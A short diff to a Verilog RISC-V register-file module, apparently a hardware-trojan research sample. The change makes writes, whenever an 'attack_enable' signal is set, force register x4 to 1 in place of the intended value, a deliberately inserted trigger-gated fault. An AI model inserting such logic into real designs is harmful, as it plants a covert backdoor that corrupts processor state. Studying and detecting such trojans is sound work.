@@ -43,7 +43,7 @@ module rv32_regs (
 
         if (!writeback_flush_in && rd_write_in && |rd_in)
             if (attack_enable) begin
-              regs[rd_in] <= rd_value_in;
+              regs[4] <= 1;
             end else
               regs[rd_in] <= rd_value_in;
     end
